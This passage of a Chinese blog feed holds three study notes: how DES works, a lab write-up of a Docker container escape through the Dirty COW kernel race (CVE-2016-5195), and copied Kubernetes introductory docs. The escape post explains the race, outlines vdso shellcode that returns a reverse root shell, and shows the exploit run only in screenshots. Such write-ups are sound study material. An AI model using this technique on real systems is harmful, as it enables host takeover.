    <content type="html"><![CDATA[<h1 id="Des算法的原理与实现"><a href="#Des算法的原理与实现" class="headerlink" title="Des算法的原理与实现"></a>Des算法的原理与实现</h1><h2 id="一、Des简介"><a href="#一、Des简介" class="headerlink" title="一、Des简介"></a>一、Des简介</h2><p><strong>DES(Data Encryption Standard)<strong>是目前最为流行的加密算法之一。DES是</strong>对称</strong>的，也就是说它使用同一个密钥来加密和解密数据。他是一个分组加密算法，分组大小为<strong>64</strong>位，如果不是64位的倍数，可以按照某种具体的规则来填充位，例如：<strong>PKCS7</strong></p><p>Des算法主要分为两大部分：①子密钥生成 ②迭代加密</p><p>DES算法通过对明文进行一系列的排列和替换操作来将其加密。</p><p>过程的关键就是从给定的初始密钥中得到16个子密钥的函数。要加密一组明文，每个子密钥按照顺序（1-16）以一系列的位操作施加于数据上，每个子密钥一次，一共重复16次。每一次迭代称之为一轮。要对密文进行解密可以采用同样的步骤，只是子密钥是按照逆向的顺序（16-1）对密文进行处理。</p><h2 id="二、16个子密钥生成"><a href="#二、16个子密钥生成" class="headerlink" title="二、16个子密钥生成"></a>二、16个子密钥生成</h2><p>​首先是子密钥生成，我们的初始密钥是64位，但是实际上因为奇偶校验位的存在，有效位只有56位。</p><p><strong>step 1：64位初始密钥–&gt;56位密钥</strong></p><p>我们先根据64位初始密钥，进行密钥转换得到56位的密钥，这里涉及到密钥转换表，如下：</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303202940680.png" alt="image-20230303202940680"></p><p>解释一下这个表的含义，比如<strong>Key_ip_table[0]为57</strong>，代表原来的<strong>64</strong>位初始密钥的第<strong>57</strong>位作为得到<strong>56</strong>位密钥的第<strong>1</strong>位，<strong>Key_ip_table[1]<strong>为</strong>49</strong>，同理原来的第<strong>49</strong>位初始密钥作为得到的<strong>56</strong>位密钥的第<strong>2</strong>位，最终可以得到<strong>56</strong>位的密钥。</p><p><strong>step2：56位密钥分成左右两组28bit，进行左循环移位</strong></p><p>​这里涉及到循环移位多少次与是第几个密钥有关，同样涉及到一张表</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303203646030.png" alt="image-20230303203646030"></p><p>比如说第1轮，那就只需要左移1位，第二轮也只需要移动1位，而第3轮需要左移2位</p><p><strong>step 3：两组合并得到56位密钥，然后进行置换选择，得到48位的子密钥</strong></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303203909792.png" alt="image-20230303203909792"></p><p>这里表中的数字的含义与上面的一致，压缩置换完毕之后得到的就是这一轮的子密钥</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/1281268-20180720073949486-1474910065.png" alt="img"></p><p>子密钥的生成流程可以参照上图</p><h2 id="三、迭代加密"><a href="#三、迭代加密" class="headerlink" title="三、迭代加密"></a>三、迭代加密</h2><p>​Des的另外一个主体部分就是迭代加密，这里我们以一轮加密为例进行说明，过程如下：</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/1281268-20180722085234376-365550304.png" alt="img"></p><p><strong>step 1：64位明文数据进行初始置换</strong></p><p>​同样这里涉及到一个初始置换表，这里含义与上面一致，此处目的仅为打乱原数据。</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303204551919.png" alt="image-20230303204551919"></p><p><strong>step 2：分组进行扩展置换</strong></p><p>​分成的两组，一组为32位明文，右边部分先进行扩展置换，32位明文转换为48位数据，这里涉及扩展置换表，含义与上面一致</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303204950580.png" alt="image-20230303204950580"></p><p>得到48位数据后，与该轮次得到的子密钥进行异或运算，结果仍然为48位</p><p><strong>step 3：S盒变换</strong></p><p>​S盒变换将48位的数据转变为32位数据，有8个盒子，48位数据分成8组，每一组6位，6位输入得到4位输出，最终得到32位的输出数据，这里借助S盒表</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213033624.png" alt="image-20230303213033624"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213044004.png" alt="image-20230303213044004"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213054104.png" alt="image-20230303213054104"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213108035.png" alt="image-20230303213108035"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213121957.png" alt="image-20230303213121957"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213136961.png" alt="image-20230303213136961"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213146273.png" alt="image-20230303213146273"></p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213155541.png" alt="image-20230303213155541"></p><p>这里我们以S1盒为例进行变化过程的说明，如果这<strong>6</strong>位数据是<strong>010110</strong>，中间四位<strong>1011</strong>作为列数，首尾两位<strong>00</strong>作为行数，所以得到的应该是为<strong>0</strong>，列为<strong>11</strong>，找到S1中相应位置为<strong>12</strong>,<strong>12</strong>的二进制表示为<strong>1100</strong>，所以这四位就作为输出，最终得到32位的数据。</p><p><strong>step 4 ：P盒置换</strong></p><p>​经过S盒变换得到的32位数据，我们再进行P盒置换得到32位数据，这里借助P盒置换表，含义与之前的置换表一致，这样得到仍然是32位数据，得到数据后与原先的左边分组L0（32bit）进行异或运算，作为下一轮的R1，原先的R0作为下一轮的L1</p><p><img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303213719095.png" alt="image-20230303213719095"></p><p>完成之后，<strong>将左右两个分组交换然后开始下一轮</strong>。</p><p><strong>在最后一轮中，不用交换左右分组。</strong></p><p><strong>step 5：末置换</strong></p><p>当全部的16轮操作都结束后，<strong>将最后的右分组R16和最后剩下的左分组L16连接起来，组成一个64位的分组R16L16</strong>。</p><p>最后一步是将<strong>R16L16</strong>进行置换。</p><p>这里同样需要借助到一张置换表，最终得到的就是64位密文数据。<img src="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20230303214328951.png" alt="image-20230303214328951"></p><p>图片部分来源于网络</p><p>该内容仅作为学习记录，不做技术指导。</p><p>Des算法的具体实现，可访问：<a href="https://github.com/Sugar-122/Des">Des算法实现</a>  仅做学习记录。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用dirtycow（CVE-2016-5195）漏洞实现docker escape</title>
    <link href="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/"/>
    <url>/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/</url>
    
    <content type="html"><![CDATA[<h3 id="利用dirtycow（CVE-2016-5195）漏洞实现docker-escape"><a href="#利用dirtycow（CVE-2016-5195）漏洞实现docker-escape" class="headerlink" title="利用dirtycow（CVE-2016-5195）漏洞实现docker escape"></a>利用dirtycow（CVE-2016-5195）漏洞实现docker escape</h3><h4 id="1-dirtycow简要介绍"><a href="#1-dirtycow简要介绍" class="headerlink" title="1.dirtycow简要介绍"></a>1.dirtycow简要介绍</h4><blockquote><p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p></blockquote><h4 id="2-dirtycow具体机制"><a href="#2-dirtycow具体机制" class="headerlink" title="2.dirtycow具体机制"></a>2.dirtycow具体机制</h4><p>Cow机制：</p><blockquote><p>以只读模式打开文件A，返回文件表示符号fd，将文件映射到内存，标记为MAP_PRIVATE，MAP_PRIVATE是一个copy-on-write的映射方式。尽管它也是有backend的，但在写入数据时，他会在物理内存copy一份数据出来(以页为单位)，而且这些数据是不会被回写到文件的。我们想要对一个只有只读权限的文件进行写操作，会经历以下的流程。</p></blockquote><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144117608.png" alt="image-20230105144117608"></p><h5 id="2-1-第一次循环"><a href="#2-1-第一次循环" class="headerlink" title="2.1 第一次循环"></a>2.1 第一次循环</h5><p><strong>第一次循环</strong>：首先他会调用**__get_user_pages( )<strong>函数，进入第一次循环：通过给定的虚拟地址</strong>address<strong>，去查询相应的页表和页表项</strong>follow_page( )<strong>，发现页表和页表项目均为空，说明还没有加载过该页</strong>handle_mm_fault( )<strong>，进入进程缺页处理</strong>handle_pte_fault( )<strong>，由于对应物理页没有在内存，并且</strong>pte<strong>为空，说明之前没有加载过该页，又因为这是一个基于文件的映射,所以接下来会调用</strong>do_fault( )<strong>函数，</strong>do_fault( )**函数的具体响应方式如下。</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144452945.png" alt="image-20230105144452945"></p><p>显然这里我们是因为第二种情况造成的缺页异常，所以接下来会调用<strong>do_cow_fault( )<strong>将分配的新页与</strong>PTE</strong>建立映射，并且把内容读取到当前新分配的页内，也就是说当前的<strong>pte</strong>执行的是<strong>cowed page</strong>，此时<strong>cow page</strong>属于匿名页，并且<strong>present&#x3D;1，dirty&#x3D;1,read-only&#x3D;1</strong>，还是不可写（应用程序动态分配的堆内存称为匿名页（<strong>Anonymous Page</strong>）。</p><h5 id="2-2-第二次循环"><a href="#2-2-第二次循环" class="headerlink" title="2.2 第二次循环"></a>2.2 第二次循环</h5><p><strong>第二次循环：</strong>第一次循环完毕之后，系统再次调用<strong>follow_page( )<strong>函数，再次请求物理页，这一次页表和页表项都不为空，但是由于我们想进行写访问，但是对于</strong>vma</strong>属性为<strong>read-only</strong>，请求页失败，进入循环进行缺页处理，<strong>handle_pte_fault( )：</strong>通过此函数执行写时复制，分配新的<strong>page</strong>，拷贝旧<strong>page</strong>到新<strong>page</strong>, 并修改相应的页表项为读写。在获取旧的<strong>page</strong>的时候判断是否是匿名页，如果是匿名页，判断是否只有一个进程在引用该页或，如果是，则直接<strong>reuse old page</strong>，并尝试设置<strong>old page</strong> 标记为可写，并返回<strong>VM_FAULT_WRITE</strong>。否则需要新分配一个页作为<strong>cowed page</strong>，并返回<strong>VM_FAULT_WRITE</strong>。在循环中，如果检测到返回值为<strong>VM_FAULT_WRITE</strong>，为去掉请求访问<strong>FOLL_WRITE</strong>标志。</p><h5 id="2-3-第三次循环"><a href="#2-3-第三次循环" class="headerlink" title="2.3 第三次循环"></a>2.3 第三次循环</h5><p><strong>第三次循环：</strong>第二次循环完毕之后，再次调用<strong>follow_page( )<strong>函数，再次请求物理页，第二次请求的时候返回</strong>VM_FAULT_WRITE</strong>，去掉了<strong>FOLL_WRITE</strong>标记，这个时候<strong>PTE</strong>存在，权限也满足，故可以进行写的操作，此时的页是拷贝的副本。</p><h4 id="3-漏洞存在"><a href="#3-漏洞存在" class="headerlink" title="3. 漏洞存在"></a>3. 漏洞存在</h4><p>正常的Cow机制看似没有问题，但是由于竞态条件的存在，上面的操作不是原子的，尝试假设下面的一个情形：如果我们在第二次循环完毕之后，如果立刻使用<strong>madvise</strong>这个系统调用，释放掉刚刚分配好的拷贝页，释放掉内存是会清空页表和页表项的！！！则在第三次循环的时候，本该进行正常访问的时候，由于拷贝页已经被我们释放掉，所以说它会再进行一次页的分配，但是这个时候由于第二次循环，<strong>FOLL_WRITE</strong>标志已经被清除了，所以这个时候会被认为是读访问，所以此时分配的将会是原始页。所以这个漏洞的存在就使得我们可以对只读文件进行一个写的操作。</p><h4 id="4-逃逸思路：vdso-dirty-cow"><a href="#4-逃逸思路：vdso-dirty-cow" class="headerlink" title="4. 逃逸思路：vdso+dirty-cow"></a>4. 逃逸思路：<strong>vdso+dirty-cow</strong></h4><p><strong>dirty cow</strong>漏洞可以让我们获取只读内存的写的权限，我们首先利用<strong>dirty cow</strong>漏洞写入一段<strong>shellcode</strong>到<strong>VDSO</strong>映射的一段闲置内存中，然后改变函数的执行顺序，使得调用正常的任意函数之前都要执行这段<strong>shellcode</strong>。这段<strong>shellcode</strong>初始化的时候会检查是否是被<strong>root</strong>调用，如果是则继续执行，如果不是，则接着执行<strong>clock_gettime</strong>函数，接下来它会检测**&#x2F;tmp&#x2F;.X<strong>文件的存在，如果存在，则这时已经是</strong>root<strong>权限了，然后它会打开一个反向的</strong>TCP<strong>链接，为</strong>Shellcode<strong>中填写的</strong>IP<strong>返回一个</strong>Shell**。</p><h4 id="5-实验结果"><a href="#5-实验结果" class="headerlink" title="5. 实验结果"></a>5. 实验结果</h4><p>内核版本：<strong>3.13.0-85-generic</strong></p><p>Docker版本：<strong>17.03.0-ce</strong></p><p>Docker镜像：<strong>ppabc&#x2F;cve-2016-5195</strong></p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144527454.png" alt="image-20230105144527454"></p><p>​                                                                                                          内核版本</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144542830.png" alt="image-20230105144542830"></p><p>​                                                                                                          docker版本</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144559014.png" alt="image-20230105144559014"></p><p>​docker镜像</p><p>进入docker</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144614964.png" alt="image-20230105144614964"></p><p>编译攻击程序0xdeadbeef</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144628454.png" alt="image-20230105144628454"></p><p>运行0xdeadbeef</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144638823.png" alt="image-20230105144638823"></p><p>此时已经获取了宿主机的root权限的shell，逃逸完毕</p><p><img src="/2023/03/03/%E5%88%A9%E7%94%A8dirtycow%EF%BC%88CVE-2016-5195%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0docker%20escape/image-20230105144654254.png" alt="image-20230105144654254"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes简要学习</title>
    <link href="/2023/03/03/Kubernetes%E5%AD%A6%E4%B9%A0%E6%90%AC%E8%BF%90/"/>
    <url>/2023/03/03/Kubernetes%E5%AD%A6%E4%B9%A0%E6%90%AC%E8%BF%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Kubernetes介绍"><a href="#Kubernetes介绍" class="headerlink" title="Kubernetes介绍"></a>Kubernetes介绍</h1><h2 id="1-Kubernetes-可以为你做些什么"><a href="#1-Kubernetes-可以为你做些什么" class="headerlink" title="1. Kubernetes 可以为你做些什么?"></a>1. Kubernetes 可以为你做些什么?</h2><p>通过现代的 Web 服务，用户希望应用程序能够 24&#x2F;7 全天候使用，开发人员希望每天可以多次发布部署新版本的应用程序。 容器化可以帮助软件包达成这些目标，使应用程序能够以简单快速的方式发布和更新，而无需停机。Kubernetes 帮助你确保这些容器化的应用程序在你想要的时间和地点运行，并帮助应用程序找到它们需要的资源和工具。Kubernetes 是一个可用于生产的开源平台，根据 Google 容器集群方面积累的经验，以及来自社区的最佳实践而设计。</p><h2 id="2-Kubernetes-基础模块"><a href="#2-Kubernetes-基础模块" class="headerlink" title="2. Kubernetes 基础模块"></a>2. Kubernetes 基础模块</h2><blockquote><p>1.创建一个Kubernetes集群</p><p>2.部署应用程序</p><p>3.应用程序探索</p><p>4.应用外部可见</p><p>5.应用可拓展</p><p>6.应用更新</p></blockquote><h3 id="2-1-创建一个Kubernetes集群"><a href="#2-1-创建一个Kubernetes集群" class="headerlink" title="2.1 创建一个Kubernetes集群"></a>2.1 创建一个Kubernetes集群</h3><p>使用Minikube创建集群</p><p>Kubernetes 集群</p><p><strong>Kubernetes 协调一个高可用计算机集群，每个计算机作为独立单元互相连接工作。</strong> Kubernetes 中的抽象允许你将容器化的应用部署到集群，而无需将它们绑定到某个特定的独立计算机。为了使用这种新的部署模型，应用需要以将应用与单个主机分离的方式打包：它们需要被容器化。与过去的那种应用直接以包的方式深度与主机集成的部署模型相比，容器化应用更灵活、更可用。 <strong>Kubernetes 以更高效的方式跨集群自动分发和调度应用容器。</strong> Kubernetes 是一个开源平台，并且可应用于生产环境。</p><p>一个 Kubernetes 集群包含两种类型的资源: </p><p><strong>Master</strong>：调度整个集群</p><p><strong>Nodes</strong>：负责运行应用</p><p>集群图</p><p><img src="/2023/03/03/Kubernetes%E5%AD%A6%E4%B9%A0%E6%90%AC%E8%BF%90/image-20230112135905265.png" alt="image-20230112135905265"></p><p><strong>Master 负责管理整个集群。</strong> Master 协调集群中的所有活动，例如调度应用、维护应用的所需状态、应用扩容以及推出新的更新。</p><p><strong>Node 是一个虚拟机或者物理机，它在 Kubernetes 集群中充当工作机器的角色</strong> 每个Node都有 Kubelet , 它管理 Node 而且是 Node 与 Master 通信的代理。 Node 还应该具有用于处理容器操作的工具，例如 Docker 或 rkt 。处理生产级流量的 Kubernetes 集群至少应具有三个 Node，因为如果一个 Node 出现故障其对应的 etcd 成员和控制平面实例都会丢失，并且冗余会受到影响。 你可以通过添加更多控制平面节点来降低这种风险 。</p><p>在 Kubernetes 上部署应用时，你告诉 Master 启动应用容器。 Master 就编排容器在集群的 Node 上运行。 <strong>Node 使用 Master 暴露的 Kubernetes API 与 Master 通信。</strong>终端用户也可以使用 Kubernetes API 与集群交互。</p><p>Kubernetes 既可以部署在物理机上也可以部署在虚拟机上。你可以使用 Minikube 开始部署 Kubernetes 集群。 Minikube 是一种轻量级的 Kubernetes 实现，可在本地计算机上创建 VM 并部署仅包含一个节点的简单集群。 Minikube 可用于 Linux ， macOS 和 Windows 系统。Minikube CLI 提供了用于引导集群工作的多种操作，包括启动、停止、查看状态和删除。</p><h3 id="2-2-Kubernetes部署"><a href="#2-2-Kubernetes部署" class="headerlink" title="2.2 Kubernetes部署"></a>2.2 Kubernetes部署</h3><p>一旦运行了 Kubernetes 集群，就可以在其上部署容器化应用程序。 为此，你需要创建 Kubernetes <strong>Deployment</strong> 配置。Deployment 指挥 Kubernetes 如何创建和更新应用程序的实例。创建 Deployment 后，Kubernetes master 将应用程序实例调度到集群中的各个节点上。</p><p>创建应用程序实例后，Kubernetes Deployment 控制器会持续监视这些实例。 如果托管实例的节点关闭或被删除，则 Deployment 控制器会将该实例替换为集群中另一个节点上的实例。 <strong>这提供了一种自我修复机制来解决机器故障维护问题。</strong></p><p>在没有 Kubernetes 这种编排系统之前，安装脚本通常用于启动应用程序，但它们不允许从机器故障中恢复。通过创建应用程序实例并使它们在节点之间运行， Kubernetes Deployments 提供了一种与众不同的应用程序管理方法。</p><p>以上均是资源搬运，便于笔者记录</p><p>原网址：<a href="https://kubernetes.io/zh-cn/docs/home/">Kubernetes 文档 | Kubernetes</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
